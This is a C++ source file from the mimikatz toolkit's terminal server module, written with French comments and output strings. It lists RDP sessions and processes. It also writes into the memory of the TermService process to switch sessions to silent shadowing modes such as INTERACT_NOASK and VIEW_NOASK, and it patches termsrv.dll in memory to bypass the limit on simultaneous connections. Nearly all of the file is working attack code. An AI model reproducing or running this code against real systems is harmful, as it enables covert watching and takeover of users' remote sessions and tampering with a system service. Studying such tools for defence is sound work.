/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : http://creativecommons.org/licenses/by/3.0/fr/
*/
#include "mod_mimikatz_terminalserver.h"
#include "..\global.h"

// http://msdn.microsoft.com/library/aa383464.aspx
vector<KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND> mod_mimikatz_terminalserver::getMimiKatzCommands()
{
	vector<KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND> monVector;
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(sessions,		L"sessions"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(processes,		L"processes"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(multirdp,		L"multirdp",		L"Patch le bureau à distance pour dépasser 2 connexions simultanées"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(viewshadow,		L"viewshadow",		L"Affiche l\'état de la prise de contrôle des sessions RDP"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(modifyshadow,	L"modifyshadow",	L"Modifie l\'état de la prise de contrôle des sessions RDP (DISABLE, INTERACT, INTERACT_NOASK, VIEW, VIEW_NOASK)"));
	return monVector;
}

bool mod_mimikatz_terminalserver::sessions(vector<wstring> * arguments)
{
	vector<mod_ts::KIWI_WTS_SESSION_INFO> mesSessions;

	if(mod_ts::getSessions(&mesSessions, (arguments->size() ? &arguments->front() : NULL)))
	{
		(*outputStream) << L"SessId\tEtat\tstrEtat" << endl;
		for(vector<mod_ts::KIWI_WTS_SESSION_INFO>::iterator maSession = mesSessions.begin(); maSession != mesSessions.end(); maSession++)
		{
			(*outputStream) <<
				setw(5) << setfill(wchar_t(' ')) << maSession->id << L'\t' <<
				setw(5) << setfill(wchar_t(' ')) << maSession->state << L'\t' <<
				setw(15) << setfill(wchar_t(' ')) << left << stateToType(maSession->state) << right << L'\t' <<
				maSession->sessionName <<
				endl;
		}
	}
	else (*outputStream) << L"mod_ts::getSessions : " << mod_system::getWinError() << endl;
	return true;
}


bool mod_mimikatz_terminalserver::processes(vector<wstring> * arguments)
{
	vector<mod_ts::KIWI_WTS_PROCESS_INFO> mesProcess;

	if(mod_ts::getProcesses(&mesProcess, (arguments->size() ? &arguments->front() : NULL)))
	{
		(*outputStream) << L"PID\tSessId\tUtilisateur" << endl;
		for(vector<mod_ts::KIWI_WTS_PROCESS_INFO>::iterator monProcess = mesProcess.begin(); monProcess != mesProcess.end(); monProcess++)
		{
			(*outputStream) << 
				setw(5) << setfill(wchar_t(' ')) << monProcess->pid << L'\t' <<
				setw(5) << setfill(wchar_t(' ')) << monProcess->sessionId << L'\t' <<
				setw(48) << setfill(wchar_t(' ')) << left << monProcess->userSid << right << L'\t' << 
				monProcess->processName << 
				endl;
		}
	}
	else (*outputStream) << L"mod_ts::getSessions : " << mod_system::getWinError() << endl;
	return true;
}

bool mod_mimikatz_terminalserver::viewshadow(vector<wstring> * arguments)
{
	DWORD session = 0;
	PDWORD ptrSession = NULL;

	if(arguments->size() == 1)
	{
		wstringstream resultat(arguments->front());
		resultat >> session;
		ptrSession = &session;
	}

	listAndOrModifySession(ptrSession);
	return true;
}

bool mod_mimikatz_terminalserver::modifyshadow(vector<wstring> * arguments)
{
	DWORD session = 0;
	PDWORD ptrSession = NULL;

	wstring strState;
	DWORD newState = 0;

	if(arguments->size() == 1)
	{
		strState.assign(arguments->front());
	}
	else if(arguments->size() == 2)
	{
		wstringstream resultat(arguments->front());
		resultat >> session;
		ptrSession = &session;

		strState.assign(arguments->back());
	}

	if(!strState.empty())
	{
		bool strError = false;
		if(_wcsicmp(strState.c_str(), L"DISABLE") == 0)	newState = 0;
		else if(_wcsicmp(strState.c_str(), L"INTERACT") == 0) newState = 1;
		else if(_wcsicmp(strState.c_str(), L"INTERACT_NOASK") == 0) newState = 2;
		else if(_wcsicmp(strState.c_str(), L"VIEW") == 0) newState = 3;
		else if(_wcsicmp(strState.c_str(), L"VIEW_NOASK") == 0) newState = 4;
		else strError = true;

		if(!strError)
			listAndOrModifySession(ptrSession, &newState);
		else
			(*outputStream) << L"Erreur de parsing de l\'argument : " << strState << endl;
	}

	return true;
}

bool mod_mimikatz_terminalserver::listAndOrModifySession(DWORD * id, DWORD * newState)
{
	bool reussite = false;

	vector<mod_patch::OS> mesOS;
	mesOS.push_back(mod_patch::WINDOWS_2003_____x86);
	mesOS.push_back(mod_patch::WINDOWS_2003_____x64);
	mesOS.push_back(mod_patch::WINDOWS_XP_PRO___x86);
	mesOS.push_back(mod_patch::WINDOWS_XP_PRO___x64);

	if(mod_patch::checkVersion(&mesOS))
	{
#ifdef _M_X64
		BYTE pattern1NT5[]		= {0x48, 0x3B, 0xFE, 0x74, 0x22};
		long offsetToWin		= -4;
#elif defined _M_IX86
		BYTE pattern1NT5[]		= {0x8D, 0x47, 0x20, 0x53, 0x50, 0xFF, 0x15};
		long offsetToWin		= -6;
#endif
		mod_service::KIWI_SERVICE_STATUS_PROCESS monService;
		wstring serviceName = L"TermService";
		wstring moduleName = L"termsrv.dll";

		if(mod_service::getUniqueForName(&monService, &serviceName))
		{
			mod_process::KIWI_MODULEENTRY32 monModule;
			if(mod_process::getUniqueModuleForName(&monModule, &moduleName, &monService.ServiceStatusProcess.dwProcessId))
			{
				PBYTE baseAddr = monModule.modBaseAddr;
				DWORD taille = monModule.modBaseSize;		

				if(HANDLE processHandle = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, monService.ServiceStatusProcess.dwProcessId))
				{
					PBYTE addrPattern = NULL;
					if(mod_memory::searchMemory(baseAddr, baseAddr + taille, pattern1NT5, &addrPattern, sizeof(pattern1NT5), true, processHandle))
					{
						PBYTE addrWinstationListHead = NULL;

						bool resInterm = false;

#ifdef _M_X64
						long offSet = 0;
						resInterm = mod_memory::readMemory(addrPattern + offsetToWin, reinterpret_cast<PBYTE>(&offSet), sizeof(long), processHandle);
						addrWinstationListHead = addrPattern + offSet;
#elif defined _M_IX86
						resInterm = mod_memory::readMemory(addrPattern + offsetToWin, reinterpret_cast<PBYTE>(&addrWinstationListHead), sizeof(PBYTE), processHandle);
#endif
						if(resInterm)
						{
							PBYTE addrWinstation = addrWinstationListHead;
							do
							{
								if(mod_memory::readMemory(addrWinstation, reinterpret_cast<PBYTE>(&addrWinstation), sizeof(PBYTE), processHandle) && addrWinstation != addrWinstationListHead)
								{
									KIWI_TS_SESSION * maSession = new KIWI_TS_SESSION();
									if(reussite = mod_memory::readMemory(addrWinstation, reinterpret_cast<PBYTE>(maSession), sizeof(KIWI_TS_SESSION), processHandle))
									{
										if((!id) || (maSession->id == *id))
										{
											(*outputStream) << L"@Winstation : " << addrWinstation << endl;

											(*outputStream) << L"\t" << maSession->prev << L" <-> " << maSession->next << endl;
											(*outputStream) << L"\tid     : " << maSession->id << endl;
											(*outputStream) << L"\tname   : " << maSession->name << endl;
											(*outputStream) << L"\tsname  : " << maSession->sname << endl;
											(*outputStream) << L"\ttype   : " << maSession->type << endl;
											(*outputStream) << L"\tshadow : " << maSession->shadow << L" (" << shadowToType(maSession->shadow) << L")" << endl;

											if(newState)
											{
												reussite = mod_memory::writeMemory(addrWinstation + FIELD_OFFSET(KIWI_TS_SESSION, shadow), newState, sizeof(DWORD), processHandle);
												(*outputStream) << L"\t      => " << *newState << L" (" <<shadowToType(*newState) << L") : " << (reussite ? L"OK" : L"KO") << endl;
											}
											(*outputStream) << endl;
										}
									}
									delete maSession;
								}
							} while(addrWinstation != addrWinstationListHead);
						}
						else (*outputStream) << L"mod_memory::readMemory " << mod_system::getWinError() << endl;
					}
					else (*outputStream) << L"mod_memory::searchMemory " << mod_system::getWinError() << endl;

					CloseHandle(processHandle);
				}
				else (*outputStream) << L"OpenProcess " << mod_system::getWinError() << endl;
			}
			else (*outputStream) << L"mod_process::getUniqueModuleForName : " << mod_system::getWinError() << endl;
		}
		else (*outputStream) << L"mod_process::getUniqueServiceForName : " << mod_system::getWinError() << endl;
	}
	return reussite;
}

bool mod_mimikatz_terminalserver::multirdp(vector<wstring> * arguments)
{
	BYTE PTRN_WIN5_TestLicence[]		= {0x83, 0xf8, 0x02, 0x7f};
	BYTE PATC_WIN5_TestLicence[]		= {0x90, 0x90};
	LONG OFFS_WIN5_TestLicence			= 3;
#ifdef _M_X64
	BYTE PTRN_WN60_Query__CDefPolicy[]	= {0x8b, 0x81, 0x38, 0x06, 0x00, 0x00, 0x39, 0x81, 0x3c, 0x06, 0x00, 0x00, 0x75};
	BYTE PATC_WN60_Query__CDefPolicy[]	= {0xc7, 0x81, 0x3c, 0x06, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x90, 0x90, 0xeb};
	BYTE PTRN_WN6x_Query__CDefPolicy[]	= {0x39, 0x87, 0x3c, 0x06, 0x00, 0x00, 0x0f, 0x84};
	BYTE PATC_WN6x_Query__CDefPolicy[]	= {0xc7, 0x87, 0x3c, 0x06, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x90, 0x90};
#elif defined _M_IX86
	BYTE PTRN_WN60_Query__CDefPolicy[]	= {0x3b, 0x91, 0x20, 0x03, 0x00, 0x00, 0x5e, 0x0f, 0x84};
	BYTE PATC_WN60_Query__CDefPolicy[]	= {0xc7, 0x81, 0x20, 0x03, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x5e, 0x90, 0x90};
	BYTE PTRN_WN6x_Query__CDefPolicy[]	= {0x3b, 0x86, 0x20, 0x03, 0x00, 0x00, 0x0f, 0x84};
	BYTE PATC_WN6x_Query__CDefPolicy[]	= {0xc7, 0x86, 0x20, 0x03, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x90, 0x90};
#endif
	LONG OFFS_WIN6_Query__CDefPolicy	= 0;
	
	BYTE * PTRN_Licence = NULL; DWORD SIZE_PTRN_Licence = 0;
	BYTE * PATC_Licence = NULL; DWORD SIZE_PATC_Licence = 0;
	LONG OFFS_PATC_Licence = 0;
	if(mod_system::GLOB_Version.dwMajorVersion < 6)
	{
		PTRN_Licence = PTRN_WIN5_TestLicence; SIZE_PTRN_Licence = sizeof(PTRN_WIN5_TestLicence);
		PATC_Licence = PATC_WIN5_TestLicence; SIZE_PATC_Licence = sizeof(PATC_WIN5_TestLicence);
		OFFS_PATC_Licence = OFFS_WIN5_TestLicence;
	}
	else
	{
		if(mod_system::GLOB_Version.dwMinorVersion < 1)
		{
			PTRN_Licence = PTRN_WN60_Query__CDefPolicy; SIZE_PTRN_Licence = sizeof(PTRN_WN60_Query__CDefPolicy);
			PATC_Licence = PATC_WN60_Query__CDefPolicy; SIZE_PATC_Licence = sizeof(PATC_WN60_Query__CDefPolicy);
		}
		else
		{
			PTRN_Licence = PTRN_WN6x_Query__CDefPolicy; SIZE_PTRN_Licence = sizeof(PTRN_WN6x_Query__CDefPolicy);
			PATC_Licence = PATC_WN6x_Query__CDefPolicy; SIZE_PATC_Licence = sizeof(PATC_WN6x_Query__CDefPolicy);
		}
		OFFS_PATC_Licence = OFFS_WIN6_Query__CDefPolicy;
	}

	mod_patch::patchModuleOfService(L"TermService", L"termsrv.dll", PTRN_Licence, SIZE_PTRN_Licence, PATC_Licence, SIZE_PATC_Licence, OFFS_PATC_Licence);
	return true;
}

wstring mod_mimikatz_terminalserver::shadowToType(DWORD shadow)
{
	switch(shadow)
	{
	case 0: return(L"DISABLE");
	case 1: return(L"INTERACT (confirmation)");
	case 2: return(L"INTERACT_NOASK");
	case 3: return(L"VIEW (confirmation)");
	case 4: return(L"VIEW_NOASK");
	default: return(L"?");
	}
}

wstring mod_mimikatz_terminalserver::stateToType(DWORD state)
{
	switch(state)
	{
	case WTSActive: return(L"Active");
	case WTSConnected: return(L"Connected");
	case WTSConnectQuery: return(L"ConnectQuery");
	case WTSShadow: return(L"Shadow");
	case WTSDisconnected: return(L"Disconnected");
	case WTSIdle: return(L"Idle");
	case WTSListen: return(L"Listen");
	case WTSReset: return(L"Reset");
	case WTSDown: return(L"Down");
	case WTSInit: return(L"Init");

	default: return(L"?");
	}
}
